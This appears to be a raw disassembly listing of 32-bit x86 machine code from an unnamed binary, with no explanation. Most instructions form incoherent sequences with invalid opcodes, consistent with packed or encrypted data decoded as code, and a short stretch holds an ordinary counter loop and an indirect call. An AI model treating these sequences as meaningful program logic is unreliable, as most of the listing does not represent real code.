  4061bb:	ss cmp ch,bh
  4061be:	cmc    
  4061bf:	lock jecxz 0x406145
  4061c2:	sahf   
  4061c3:	rol    ebp,1
  4061c5:	test   DWORD PTR [edx+edi*1+0x7e3f7354],esp
  4061cc:	jle    0x40621d
  4061ce:	jns    0x40624e
  4061d0:	jle    0x40622c
  4061d2:	and    DWORD PTR [edi-0x65bab145],0x2b
  4061d9:	push   cs
  4061da:	outs   dx,DWORD PTR ds:[esi]
  4061db:	inc    edx
  4061dc:	inc    eax
  4061dd:	aaa    
  4061de:	popw   es
  4061e0:	pop    esi
  4061e1:	and    esi,ebp
  4061e3:	sbb    DWORD PTR [esi],edx
  4061e5:	fidivr WORD PTR [ebx+0x54]
  4061e8:	jnp    0x406249
  4061ea:	mov    esp,0x1f66a4a
  4061ef:	inc    eax
  4061f0:	fild   QWORD PTR [edi+0x26]
  4061f3:	std    
  4061f4:	es xchg edi,eax
  4061f6:	ret    
  4061f7:	inc    esp
  4061f8:	fiadd  DWORD PTR [ecx-0x5caad08b]
  4061fe:	push   ss
  4061ff:	or     dl,ah
  406201:	xchg   esi,eax
  406202:	mov    edi,0x24d36df1
  406207:	or     al,0xd4
  406209:	pop    edi
  40620a:	push   esp
  40620b:	int    0xc0
  40620d:	dec    eax
  40620e:	pop    esi
  40620f:	jecxz  0x4061b4
  406211:	fcmovbe st,st(5)
  406213:	mov    edi,0x8a47e9ee
  406218:	push   ebp
  406219:	pop    edx
  40621a:	jbe    0x4061c4
  40621c:	loope  0x40626e
  40621e:	jmp    0x4061ad
  406220:	dec    esi
  406221:	adc    BYTE PTR [edi+0x6957ce26],cl
  406227:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406228:	inc    esp
  406229:	adc    sp,bx
  40622c:	fbstp  TBYTE PTR [edx+edi*2]
  40622f:	clc    
  406230:	fild   DWORD PTR [edx+0x5d]
  406233:	mov    ?,WORD PTR [ebx+edx*1-0x62d17f92]
  40623a:	stos   BYTE PTR es:[edi],al
  40623b:	shl    DWORD PTR [ebx],cl
  40623d:	pop    ebp
  40623e:	and    bl,BYTE PTR [ebp+0x38]
  406241:	lods   eax,DWORD PTR ds:[esi]
  406242:	neg    DWORD PTR [ebp+0x79975091]
  406248:	nop
  406249:	scas   al,BYTE PTR es:[edi]
  40624a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40624b:	imul   esi,DWORD PTR [edi],0x60badc4f
  406251:	adc    esi,DWORD PTR ds:0x6dfc74ec
  406257:	jmp    0x30b9b6c4
  40625c:	sub    BYTE PTR [ecx+0x17073931],dl
  406262:	push   ebx
  406263:	sbb    eax,0xfa31767b
  406268:	div    BYTE PTR [ecx+0x1bb94d7a]
  40626e:	test   eax,0xe441e3f6
  406273:	and    DWORD PTR [eax+eiz*1+0x4d],0xffffff83
  406278:	push   eax
  406279:	out    0x56,eax
  40627b:	cld    
  40627c:	jmp    0xc65f:0x3719b6a
  406283:	pushf  
  406284:	mov    ds:0x1eacda14,eax
  406289:	gs (bad) 
  40628b:	dec    ebx
  40628c:	adc    BYTE PTR [eax+0x693e2931],dh
  406292:	add    ch,0x43
  406295:	icebp  
  406296:	sbb    eax,0x11d6b00
  40629b:	add    al,0xb3
  40629d:	ja     0x4062d2
  40629f:	ja     0x4062fb
  4062a1:	xchg   esi,eax
  4062a2:	lea    edi,[edi]
  4062a4:	lds    edx,FWORD PTR [esp+eiz*8-0x3708d73]
  4062ab:	push   ebp
  4062ac:	mov    ebp,0x1d6392f9
  4062b1:	test   DWORD PTR [edx+eiz*4-0x6b0d929b],0xb64f38f1
  4062bc:	add    BYTE PTR [ebx+0x75f8a457],dh
  4062c2:	(bad)  
  4062c3:	xchg   ecx,eax
  4062c4:	pop    es
  4062c5:	mov    eax,0x45c45352
  4062ca:	loopne 0x406262
  4062cc:	lahf   
  4062cd:	(bad)  
  4062ce:	ins    DWORD PTR es:[edi],dx
  4062cf:	jo     0x4062b4
  4062d1:	cs pop esp
  4062d3:	mov    esp,DWORD PTR [esi+0x7]
  4062d6:	push   edx
  4062d7:	sbb    BYTE PTR [eax+0x4c],0xe7
  4062db:	adc    eax,0x3a4fd41f
  4062e0:	mov    bh,0x27
  4062e2:	sub    edx,edi
  4062e4:	jecxz  0x406317
  4062e6:	sti    
  4062e7:	mov    dh,0xda
  4062e9:	out    0x2c,eax
  4062eb:	adc    dh,0x3a
  4062ee:	dec    ebp
  4062ef:	es ss aam 0x47
  4062f3:	add    al,0x93
  4062f5:	sub    BYTE PTR [eax],ah
  4062f7:	je     0x4062d0
  4062f9:	and    DWORD PTR [ebx-0x30],edx
  4062fc:	imul   esi,DWORD PTR [eax+0x6e],0xffffffa9
  406300:	inc    ebp
  406301:	rol    ebx,0x4a
  406304:	xchg   BYTE PTR [eax],al
  406306:	jmp    0x4062cf
  406308:	jmp    FWORD PTR [edx]
  40630a:	sar    BYTE PTR [edx+0x456d6577],0xab
  406311:	push   esi
  406312:	add    al,0xb5
  406314:	jle    0x4062c1
  406316:	leave  
  406317:	sbb    eax,0xe419877e
  40631c:	pop    esp
  40631d:	icebp  
  40631e:	jns    0x4062f9
  406320:	aam    0x43
  406322:	in     eax,0x3d
  406324:	rol    DWORD PTR [esi],1
  406326:	adc    DWORD PTR [edi+0x189cc6de],eax
  40632c:	cmp    al,0x3a
  40632e:	leave  
  40632f:	dec    ebx
  406330:	pop    es
  406331:	scas   al,BYTE PTR es:[edi]
  406332:	lods   eax,DWORD PTR ds:[esi]
  406333:	mov    ecx,0xd0801605
  406338:	pop    edi
  406339:	out    0xa9,eax
  40633b:	mov    WORD PTR [ecx+0x35],cs
  40633e:	mov    al,ds:0x259249fc
  406343:	test   BYTE PTR [ebx+0x33031c1a],ah
  406349:	mov    edx,0x1f7e077c
  40634e:	mov    cs:0x737a6dc5,al
  406354:	push   0x15
  406356:	mov    ebx,DWORD PTR [ebp+0x13]
  406359:	outs   dx,BYTE PTR ds:[esi]
  40635a:	or     BYTE PTR [eax],0x1d
  40635d:	loop   0x406302
  40635f:	push   ebx
  406360:	cmp    eax,0xeca4610e
  406365:	sub    bh,BYTE PTR [ebx+0x78]
  406368:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406369:	mov    bh,0x90
  40636b:	mov    WORD PTR [edx-0x42],ss
  40636e:	mov    eax,ds:0xe962bab9
  406373:	aam    0xc4
  406375:	icebp  
  406376:	push   es
  406377:	cli    
  406378:	xchg   DWORD PTR [eax],ebp
  40637a:	jmp    0x40637c
  40637c:	icebp  
  40637d:	cwde   
  40637e:	ret    
  40637f:	xor    al,BYTE PTR [ebx+0x4]
  406382:	pop    edi
  406383:	outs   dx,DWORD PTR ds:[esi]
  406384:	xor    BYTE PTR [ebp+0x6970185e],bl
  40638a:	adc    eax,0xaf9bbf9e
  40638f:	push   ds
  406390:	imul   ecx,esi,0xffffffa5
  406393:	and    ah,ch
  406395:	jmp    0xe5d90ed7
  40639a:	lods   al,BYTE PTR ds:[esi]
  40639b:	mov    bl,0x8a
  40639d:	mov    bl,0xc1
  40639f:	xchg   BYTE PTR [esi+0x4e329b0d],al
  4063a5:	int3   
  4063a6:	sti    
  4063a7:	mov    ebp,edi
  4063a9:	jg     0x4063f4
  4063ab:	lock bound edi,QWORD PTR [edi+0xc]
  4063af:	push   eax
  4063b0:	jmp    0xb1f12f52
  4063b5:	push   ds
  4063b6:	push   ebx
  4063b7:	push   esi
  4063b8:	stos   BYTE PTR es:[edi],al
  4063b9:	ficom  WORD PTR [esi+eax*2-0x71]
  4063bd:	enter  0x423a,0xf0
  4063c1:	test   ebp,0x4d2fed7a
  4063c7:	pop    ebp
  4063c8:	mov    eax,ds:0x40faf460
  4063cd:	ds aaa 
  4063cf:	(bad)  
  4063d0:	dec    ebp
  4063d1:	sub    edi,esp
  4063d3:	fst    st(4)
  4063d5:	enter  0xef6,0x6b
  4063d9:	xchg   edx,eax
  4063da:	pop    ebp
  4063db:	adc    DWORD PTR [ecx-0x7a],0xff73b3ee
  4063e2:	ins    BYTE PTR es:[edi],dx
  4063e3:	push   esp
  4063e4:	add    dl,al
  4063e6:	aaa    
  4063e7:	aas    
  4063e8:	nop
  4063e9:	outs   dx,BYTE PTR ds:[esi]
  4063ea:	or     al,0x35
  4063ec:	xchg   al,ah
  4063ee:	dec    esp
  4063ef:	inc    edx
  4063f0:	sub    edx,DWORD PTR [esi-0x7f]
  4063f3:	cli    
  4063f4:	add    dl,BYTE PTR [ecx]
  4063f6:	leave  
  4063f7:	xchg   ebx,eax
  4063f8:	pop    eax
  4063f9:	inc    ebx
  4063fa:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4063fc:	and    ebx,DWORD PTR [esi]
  4063fe:	mov    bh,0xbb
  406400:	xchg   edi,edi
  406402:	add    al,0xb2
  406404:	xchg   esi,eax
  406405:	xchg   ecx,eax
  406407:	cdq    
  406408:	cmp    bh,0x77
  40640b:	mov    eax,0x2fbb1996
  406410:	or     BYTE PTR [ecx-0x63a2e060],0xb
  406417:	jnp    0x406427
  406419:	or     DWORD PTR [edi+0x4fb26613],esi
  40641f:	or     DWORD PTR [edi-0x2],esi
  406422:	or     BYTE PTR [edi],ah
  406424:	mov    al,0xf0
  406426:	cs pop edx
  406428:	inc    ebp
  406429:	jl     0x40643c
  40642b:	sub    eax,0x5e186a46
  406430:	(bad)  
  406431:	adc    esi,ebx
  406433:	dec    esp
  406434:	add    si,bp
  406437:	add    edx,ebp
  406439:	and    al,0x97
  40643b:	mov    edx,0xe1c4ae37
  406440:	arpl   WORD PTR [edx-0x43776d55],bp
  406446:	or     ebx,DWORD PTR [ebp+0x35]
  406449:	dec    ebx
  40644a:	shl    DWORD PTR [ebx],0xe3
  40644d:	mov    WORD PTR [ecx],?
  40644f:	cs leave 
  406451:	ret    
  406452:	je     0x4064a3
  406454:	enter  0xb7,0xe
  406458:	xchg   ebx,eax
  406459:	or     DWORD PTR [ebx],esp
  40645b:	in     al,dx
  40645c:	cmc    
  40645d:	mov    ebp,0x4fcbac24
  406462:	jecxz  0x406427
  406464:	pop    edi
  406465:	nop
  406466:	(bad)  
  406467:	push   ss
  406468:	mov    eax,ds:0x70250c6
  40646d:	into   
  40646e:	adc    BYTE PTR [edx],0xca
  406471:	ins    DWORD PTR es:[edi],dx
  406472:	scas   eax,DWORD PTR es:[edi]
  406473:	mov    al,ds:0xae8b01f5
  406478:	in     eax,dx
  406479:	into   
  40647a:	arpl   WORD PTR [eax],bx
  40647c:	fld    TBYTE PTR [edx-0xa]
  40647f:	(bad)  
  406481:	mov    eax,ds:0x45445936
  406486:	mov    dh,0x5d
  406488:	fisub  WORD PTR [ecx+0x5e]
  40648b:	fldcw  WORD PTR [eax-0x65]
  40648e:	stos   DWORD PTR es:[edi],eax
  40648f:	xor    eax,0x1b2ffa29
  406494:	loopne 0x4064fa
  406496:	mov    eax,ebx
  406498:	add    edi,esp
  40649a:	add    al,0xf6
  40649c:	jb     0x406467
  40649e:	push   esi
  40649f:	sbb    edi,DWORD PTR [eax]
  4064a1:	and    al,0x26
  4064a3:	std    
  4064a4:	(bad)  
  4064a5:	hlt    
  4064a6:	ss mov dx,0xeba2
  4064ab:	leave  
  4064ac:	push   0x6f
  4064ae:	dec    esi
  4064af:	test   eax,0x96f3a90a
  4064b4:	fist   DWORD PTR [eax+0x31]
  4064b7:	out    0x37,eax
  4064b9:	das    
  4064ba:	adc    ecx,DWORD PTR [ebx+0x7c2413c3]
  4064c0:	add    al,dh
  4064c2:	ret    0x7280
  4064c5:	push   0x5952c661
  4064ca:	test   al,0x87
  4064cc:	lahf   
  4064cd:	out    0xa6,al
  4064cf:	mov    ebp,0xb8a82cff
  4064d4:	out    dx,eax
  4064d5:	or     BYTE PTR ds:0x4eda0812,0x6d
  4064dc:	neg    BYTE PTR [edx]
  4064de:	mov    dh,0xef
  4064e0:	out    0x25,eax
  4064e2:	lds    ebx,FWORD PTR es:[edi-0x21]
  4064e6:	int3   
  4064e7:	rcr    ecx,cl
  4064e9:	in     al,dx
  4064ea:	das    
  4064eb:	adc    esi,DWORD PTR [edx-0x2c80faf7]
  4064f1:	pop    esi
  4064f2:	sbb    BYTE PTR [esi],dl
  4064f4:	adc    BYTE PTR [ebx+0x33],0x41
  4064f8:	jns    0x40656e
  4064fa:	add    eax,0x310599a6
  4064ff:	shr    BYTE PTR [esi+0x5e],0x14
  406503:	cmp    al,0x69
  406505:	aam    0xdf
  406507:	and    BYTE PTR [esi-0x187d4c76],dh
  40650d:	ret    
  40650e:	cli    
  40650f:	sub    cl,bl
  406511:	cmp    bl,BYTE PTR [esi]
  406513:	jno    0x406549
  406515:	es sbb ecx,DWORD PTR ds:[edi-0x674e5d50]
  40651d:	xor    eax,0x395c19aa
  406522:	push   0xfffffff8
  406524:	dec    edi
  406525:	push   ss
  406526:	xor    edx,ecx
  406528:	jnp    0x406514
  40652a:	cmp    bh,BYTE PTR [eax+0x762aec95]
  406530:	retf   
  406531:	ret    
  406532:	jmp    0x7f66:0xd10bb33a
  406539:	xlat   BYTE PTR ds:[ebx]
  40653a:	xchg   esp,eax
  40653b:	out    0x71,eax
  40653d:	mov    bh,0x5d
  40653f:	sbb    DWORD PTR [eax],eax
  406541:	fsubr  DWORD PTR [eax-0x23]
  406544:	ja     0x40655f
  406546:	mov    dh,0x2d
  406548:	sub    eax,0xcad8592
  40654d:	push   ebx
  40654e:	mov    esp,0x8d2abe0e
  406553:	sub    eax,0x476466a
  406558:	push   es
  406559:	sub    eax,0x3c4fd27b
  40655e:	rcr    DWORD PTR [eax-0x1fc7d19a],cl
  406564:	pop    edi
  406565:	pop    ebp
  406566:	inc    ebp
  406567:	outs   dx,BYTE PTR ds:[esi]
  406568:	outs   dx,DWORD PTR ds:[esi]
  406569:	call   0xcdc7:0xe6f44afa
  406570:	push   0xffffffb0
  406572:	imul   eax,esi,0x14
  406575:	dec    ecx
  406576:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406577:	shl    BYTE PTR [ebp+0x75],cl
  40657a:	pushf  
  40657b:	push   edx
  40657c:	(bad)  [edx-0x364991cf]
  406582:	(bad)  
  406583:	xor    eax,0xc59852bd
  406588:	cmc    
  406589:	inc    esp
  40658a:	jae    0x4065d1
  40658c:	pop    eax
  40658d:	fistp  DWORD PTR [eax+0x53]
  406590:	sub    eax,0x211bf0fa
  406595:	outs   dx,BYTE PTR ds:[esi]
  406596:	cwde   
  406597:	clc    
  406598:	jnp    0x4065e9
  40659a:	jbe    0x4065c9
  40659c:	or     esi,DWORD PTR [ebx-0x21]
  40659f:	div    BYTE PTR [ebx]
  4065a1:	pop    edi
  4065a2:	lea    eax,[ebp-0x24]
  4065a5:	movzx  ecx,WORD PTR ds:0x4345bb
  4065ac:	and    ecx,DWORD PTR ds:0x4344f3
  4065b2:	mov    DWORD PTR ds:0x4345bb,ecx
  4065b8:	mov    DWORD PTR [ebp-0x28],eax
  4065bb:	adc    DWORD PTR ds:0x4344ff,ecx
  4065c1:	mov    eax,DWORD PTR [ebp+0x8]
  4065c4:	sbb    ecx,DWORD PTR ds:0x43460f
  4065ca:	mov    DWORD PTR [ebp-0x20],eax
  4065cd:	push   ebx
  4065ce:	sub    DWORD PTR ds:0x4344f7,ebx
  4065d4:	lea    eax,[ebp-0x18]
  4065d7:	mov    DWORD PTR [ebp-0x1c],eax
  4065da:	xor    DWORD PTR ds:0x43454f,edx
  4065e0:	mov    eax,DWORD PTR [ebp-0x1c]
  4065e3:	and    DWORD PTR ds:0x4344eb,0x0
  4065ed:	mov    ecx,DWORD PTR ds:0x4344eb
  4065f3:	inc    ecx
  4065f4:	mov    DWORD PTR ds:0x4344eb,ecx
  4065fa:	cmp    DWORD PTR ds:0x4344eb,0x1e
  406601:	jne    0x40661a
  406607:	push   DWORD PTR [ebp-0x14]
  40660a:	push   0x434547
  40660f:	push   0x43481f
  406614:	call   DWORD PTR ds:0x413400
  40661a:	cmp    DWORD PTR ds:0x4344eb,0x1c
  406621:	jb     0x4065ed
  406627:	jmp    0x406a15
  40662c:	call   0x70d95cef
  406631:	mov    al,0x70
  406633:	dec    esi
  406634:	mov    BYTE PTR [ecx],dh
  406636:	push   esi
  406637:	inc    esp
  406638:	xchg   ch,ah
  40663a:	arpl   WORD PTR [edx],bx
  40663c:	dec    esp
  40663d:	cmp    edi,DWORD PTR [esi+0x7e]
  406640:	dec    edi
  406641:	jns    0x4066c1
  406643:	jle    0x40665d
  406645:	cmp    esi,ecx
  406647:	or     al,0x97
  406649:	loopne 0x406616
  40664b:	inc    esi
  40664c:	and    DWORD PTR ds:0x86037a04,0xffffff93
  406653:	push   cs
  406654:	jne    0x4066ac
  406656:	push   ss
  406657:	xchg   ebp,eax
  406658:	popa   
  406659:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40665a:	add    DWORD PTR [edx],esi
  40665c:	xchg   ebp,eax
  40665d:	daa    
  40665e:	mov    fs,WORD PTR [eax]
  406660:	stc    
  406661:	xchg   esi,eax
  406662:	(bad)
  406665:	jl     0x4066b4
  406667:	jl     0x4066bf
  406669:	daa    
  40666a:	ins    BYTE PTR es:[edi],dx
  40666b:	clc    
  40666c:	dec    ecx
  40666d:	nop
  40666e:	cmp    esp,edx
  406670:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406671:	push   ecx
  406672:	sub    al,0x2e
  406674:	inc    ebx
  406675:	lock dec esp
  406677:	ret    0x8857
  40667a:	jl     0x40663c
  40667c:	call   0xdb56df13
  406681:	pop    ebx
  406682:	and    eax,0x391fdeb7
  406687:	leave  
  406688:	fisub  DWORD PTR [esi]
  40668a:	mov    esp,0xc09d67ca
  40668f:	inc    ebx
  406690:	gs ins BYTE PTR es:[edi],dx
  406692:	lea    edi,[ebx-0xa5db4aa]
  406698:	ja     0x406690
  40669a:	adc    eax,0xda2ba302
  40669f:	push   ebx
  4066a0:	add    eax,0xd7b80f2
  4066a5:	dec    edx
  4066a6:	in     eax,dx
  4066a7:	pushf  
  4066a8:	(bad)  
  4066a9:	je     0x406661
  4066ab:	jecxz  0x40671c
  4066ad:	lods   al,BYTE PTR ds:[esi]
  4066ae:	(bad)  
  4066b0:	nop
  4066b1:	call   0xba82:0xe88f5bba
  4066b8:	add    ebp,DWORD PTR [edi]
  4066ba:	enter  0x701f,0xe3
  4066be:	inc    edi
  4066bf:	jb     0x40670f
  4066c1:	jnp    0x406713
  4066c3:	and    al,dh
  4066c5:	pop    ebp
  4066c6:	es aaa 
  4066c8:	or     dl,0x9d
  4066cb:	mov    dh,0x26
  4066cd:	push   es
  4066ce:	push   ebp
  4066cf:	sbb    DWORD PTR [ebx],ebx
  4066d1:	outs   dx,DWORD PTR ds:[esi]
  4066d2:	mov    ds:0xa538889e,al
  4066d7:	ds ss xor al,0x56
  4066db:	jb     0x406754
  4066dd:	ror    BYTE PTR [eax-0x2d],1
  4066e0:	hlt    
  4066e1:	mov    ebp,0x98bac3a2
  4066e6:	inc    ebx
  4066e7:	mov    dl,0xb6
  4066e9:	and    DWORD PTR [edx+eax*1+0xa48da11],ebp
  4066f0:	pop    eax
  4066f1:	pop    esp
  4066f2:	push   eax
  4066f3:	das    
  4066f4:	pop    es
  4066f5:	jl     0x4066d6
  4066f7:	jne    0x406714
  4066f9:	add    eax,0x80280e44
  4066fe:	xlat   BYTE PTR ds:[ebx]
  4066ff:	test   al,0x5f
  406701:	and    eax,0x3f292338
  406706:	enter  0x30a0,0x1d
  40670a:	aam    0x74
  40670c:	imul   esi,DWORD PTR es:[ebx-0x78],0x1bd809d2
  406714:	mov    ecx,DWORD PTR [eax]
  406716:	or     DWORD PTR [ebx],esi
  406718:	das    
  406719:	inc    ecx
  40671a:	mov    ah,0x53
  40671c:	mov    dl,0xb6
  40671e:	psubsb mm5,QWORD PTR [edi-0x29]
  406722:	sbb    ebx,ebp
  406724:	sbb    bh,bl
  406726:	push   esp
  406727:	push   eax
  406728:	jge    0x406729
  40672a:	pop    edi
  40672b:	pusha  
  40672c:	iret   
  40672d:	adc    eax,0xe76a53b9
  406732:	push   ebx
  406733:	fisttp WORD PTR [edi]
  406735:	push   cs
  406736:	or     al,0xea
  406738:	mov    es,WORD PTR [ebp+0x23]
  40673b:	(bad)  
  40673c:	leave  
  40673d:	jmp    0x40672f
  40673f:	mov    WORD PTR ds:0x6b60965,?
  406745:	or     edi,0xffffffb4
  406748:	dec    eax
  406749:	lods   al,BYTE PTR ds:[esi]
  40674a:	mov    ds:0x7afb1175,eax
  40674f:	sbb    edx,DWORD PTR [edx]
  406751:	push   edi
  406752:	mov    bh,0x67
  406754:	inc    esi
  406755:	fcomp  st(5)
  406757:	lock ss loop 0x4067b9
  40675b:	pop    edi
  40675c:	scas   al,BYTE PTR es:[edi]
  40675d:	out    dx,al
  40675e:	test   al,0xa2
  406760:	mov    ch,BYTE PTR ss:[eax]
  406763:	dec    ecx
  406764:	frstor [ebx]
  406766:	popf   
  406767:	int3   
  406768:	dec    edx
  406769:	mov    esi,0x8eaccf91
  40676e:	mov    cl,dh
  406770:	sbb    BYTE PTR [esi+eax*8+0x5b6f11db],ah
  406777:	cs add eax,0xd441563a
  40677d:	es xchg ebx,eax
  40677f:	or     BYTE PTR [eax+0x2c],ah
  406782:	test   al,0x9d
  406784:	enter  0x90af,0x23
  406788:	call   0xc2a0a2d7
  40678d:	call   0x3b6df396
  406792:	cld    
  406793:	mov    al,0x47
  406795:	loop   0x4067a1
  406797:	and    esi,0x68d9b93b
  40679d:	mov    ebp,0x74142e9f
  4067a2:	add    DWORD PTR [ebx],edx
  4067a4:	outs   dx,BYTE PTR ds:[esi]
  4067a5:	push   ecx
  4067a6:	xchg   edx,eax
  4067a7:	adc    eax,0x1f7ae9e5
  4067ac:	test   eax,0xd8f11c87
  4067b1:	popf   
  4067b2:	xor    BYTE PTR [ebx],bh
  4067b4:	sbb    al,0x7
  4067b6:	aas    
  4067b7:	call   0x9e41:0xb5cf08a7
  4067be:	mov    ds:0xbf54c479,al
  4067c3:	aad    0xd7
  4067c5:	xchg   edi,eax
  4067c6:	push   es
  4067c7:	call   0x37464810
  4067cc:	inc    ebx
  4067cd:	mov    DWORD PTR [ebp+eiz*8+0x3aa5630f],esp
  4067d4:	fadd   QWORD PTR [edi-0x40063462]
  4067da:	xchg   ebx,eax
  4067db:	inc    edx
  4067dc:	mov    edi,0x702de7df
  4067e1:	add    eax,0x93dfce69
  4067e6:	sar    BYTE PTR [ebp-0x5641c98],cl
  4067ec:	sub    eax,0x2e2ae092
  4067f1:	mov    eax,0x621cb2ef
  4067f6:	outs   dx,BYTE PTR cs:[esi]
  4067f8:	das    
  4067f9:	js     0x40678f
  4067fb:	retf   
  4067fc:	inc    edi
  4067fd:	rol    bl,cl
  4067ff:	inc    esp
  406800:	jae    0x4067c5
  406802:	adc    DWORD PTR [esi],esp
  406804:	das    
  406805:	pop    es
  406806:	or     al,0x5
  406808:	or     al,0xc2
  40680a:	mov    esp,0x5498410f
  40680f:	data16 std 
  406811:	stos   BYTE PTR es:[edi],al
  406812:	fnstenv [edi-0x72]
  406815:	mov    DWORD PTR [ebp+0x3d9414d6],eax
  40681b:	mov    ch,0x5a
  40681d:	retf   0xfb0e
  406820:	pop    eax
  406821:	xchg   edi,eax
  406822:	fs push eax
  406824:	mov    cl,0x57
  406826:	arpl   bp,si
  406828:	dec    ebp
  406829:	pop    ss
  40682a:	lahf   
  40682b:	repz clc 
  40682d:	dec    eax
  40682e:	pushf  
  40682f:	inc    ecx
  406830:	fisubr DWORD PTR [edi+0x2009da5d]
  406836:	jp     0x40685e
  406838:	add    BYTE PTR [edi],bh
  40683a:	adc    al,0x6
  40683c:	xor    edx,DWORD PTR [eax+0x40029277]
  406842:	shl    DWORD PTR [edi],0xa3
  406845:	sbb    eax,0xff26cd04
  40684a:	int    0x7c
  40684c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40684d:	pop    ss
  40684e:	std    
  40684f:	xchg   esp,eax
  406850:	pusha  
  406851:	sbb    DWORD PTR [edi],eax
  406853:	cmp    al,0xc3
  406855:	mov    cs,WORD PTR [ecx-0x7a]
  406858:	pushf  
  406859:	arpl   ax,ax
  40685b:	push   esp
  40685c:	adc    eax,0x9fa430f3
  406861:	adc    eax,0x481a4692
  406866:	xchg   ebp,eax
  406867:	int    0x21
  406869:	je     0x40680e
  40686b:	xchg   esi,eax
  40686c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40686d:	mov    cl,0xf0
  40686f:	pop    edi
  406870:	enter  0x5aeb,0x41
  406874:	mov    al,0x93
  406876:	push   ds
  406877:	call   0x3e63efba
  40687c:	mov    ds:0x3872b1b4,eax
  406881:	push   eax
  406882:	and    bl,dl
  406884:	dec    edx
  406885:	push   esi
  406886:	dec    ecx
  406887:	pop    edx
  406888:	arpl   WORD PTR [esi],cx
  40688a:	xor    BYTE PTR [ebp+edi*1-0x55edd6f5],0x5b
  406892:	ret    0xafb1
  406895:	xchg   ecx,eax
  406896:	int    0x77
  406898:	sub    esi,edx
  40689a:	out    0xde,eax
  40689c:	imul   edi,DWORD PTR [esi],0x2c6fc3d7
  4068a2:	test   al,0x9c
  4068a4:	xchg   edx,eax
  4068a5:	(bad)  
  4068a6:	jmp    0x1efef18
  4068ab:	jmp    0x4068d0
  4068ad:	rcl    DWORD PTR [edi-0x6f],cl
  4068b0:	and    eax,0x7fc7b8c9
  4068b5:	loop   0x40689c
  4068b7:	std    
  4068b8:	or     eax,0x25980684
  4068bd:	loop   0x40685d
  4068bf:	pop    ss
  4068c0:	sub    edx,ebp
  4068c2:	and    esp,edx
  4068c4:	cmp    dh,BYTE PTR [esi+0x74]
  4068c7:	inc    edi
  4068c8:	call   0xb317:0xb84c26fc
  4068cf:	xchg   edx,eax
  4068d0:	xchg   ebx,eax
  4068d1:	nop
  4068d2:	adc    DWORD PTR [edx-0x7b],ebx
  4068d5:	cmp    ebx,DWORD PTR [ebx-0x595db18c]
  4068db:	dec    ebx
  4068dc:	sbb    edx,DWORD PTR [edi-0x15]
  4068df:	add    eax,DWORD PTR [esi+eax*2]
  4068e2:	xor    al,BYTE PTR [edi]
  4068e4:	test   al,0xe1
  4068e6:	call   0x4322:0xe0e7a366
  4068ed:	adc    al,0x83
  4068ef:	dec    edx
  4068f0:	xchg   esp,eax
  4068f1:	stc    
  4068f2:	inc    edi
  4068f3:	xchg   DWORD PTR [edx+ebp*1],ebx
  4068f6:	inc    eax
  4068f7:	inc    eax
  4068f8:	sahf   
  4068f9:	jne    0x406924
  4068fb:	sbb    al,0x1b
  4068fd:	lds    edx,FWORD PTR [esi+0x3b933a9]
  406903:	test   DWORD PTR [ecx],edi
  406905:	idiv   bl
  406907:	loopne 0x4068d4
  406909:	mov    ah,0x24
  40690b:	in     al,0xac
  40690d:	ins    BYTE PTR es:[edi],dx
  40690e:	jl     0x4068e2
  406910:	mov    edx,0xf67c7064
  406915:	(bad)  
  406917:	es mov edi,0x77e14208
  40691d:	jns    0x406957
  40691f:	dec    esp
  406920:	sub    DWORD PTR [eax-0x6b8fe295],ebp
  406926:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406927:	pop    esp
  406928:	mov    ss,WORD PTR [esi]
  40692a:	pop    esp
  40692b:	jl     0x4069ab
  40692d:	push   edx
  40692e:	jmp    0x1e3d1d0a
  406933:	mov    ds:0x35df4f49,al
  406938:	xlat   BYTE PTR ds:[ebx]
  406939:	mov    ds:0xe099660,eax
  40693e:	into   
  40693f:	stos   BYTE PTR es:[edi],al
  406940:	outs   dx,BYTE PTR ds:[esi]
  406941:	lds    esi,FWORD PTR [ebx]
  406943:	call   0xf2e4:0xa597c4a9
  40694a:	pop    ebp
  40694b:	mov    bl,BYTE PTR [ebx]
  40694d:	call   0x7b7e05e
  406952:	nop
  406953:	fst    QWORD PTR [esi]
  406955:	adc    BYTE PTR [eax+0x7ef3e4f9],ah
  40695b:	xor    ch,BYTE PTR [eax+0x33030817]
  406961:	jo     0x4069a5
  406963:	addr16 cdq 
  406965:	imul   edi,DWORD PTR [eax+0x2f],0xffffff96
  406969:	int    0x25
  40696b:	xor    eax,0xbbf27c2e
  406970:	xchg   esi,eax
  406971:	sub    cl,BYTE PTR [ebp+0xd0fd8ed]
  406977:	or     bh,BYTE PTR [eax*8-0x729605a9]
  40697e:	ret    
  40697f:	out    0x8f,al
  406981:	mov    edx,DWORD PTR [ebx-0xc]
  406984:	and    bl,BYTE PTR ds:0x375ed3d2
  40698a:	sub    eax,0xf4a1eeb2
  40698f:	retf   0xadf7
  406992:	cmp    ebp,DWORD PTR gs:[edx-0x22ae3c21]
  406999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40699a:	inc    edx
  40699b:	cli    
  40699c:	outs   dx,BYTE PTR ds:[esi]
  40699d:	or     ebp,DWORD PTR ds:0xead952aa
  4069a3:	cmp    al,0x64
  4069a5:	nop
  4069a6:	ins    BYTE PTR es:[edi],dx
  4069a7:	cmp    DWORD PTR ds:0xbdabe6c8,ebx
  4069ad:	dec    eax
  4069ae:	fincstp 
  4069b0:	enter  0x3b1f,0x53
  4069b4:	mov    bh,0xa9
  4069b6:	lods   eax,DWORD PTR ds:[esi]
  4069b7:	js     0x40693b
  4069b9:	push   ecx
  4069ba:	add    bl,bh
  4069bc:	aaa    
  4069bd:	mov    ds:0xae5093d6,eax
  4069c2:	push   cs
  4069c3:	jmp    0x4069fc
  4069c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069c6:	aaa    
  4069c7:	inc    ebx
  4069c8:	cmp    esp,ecx
  4069ca:	push   ds
  4069cb:	inc    edx
  4069cc:	jns    0x4069bd
  4069ce:	push   esi
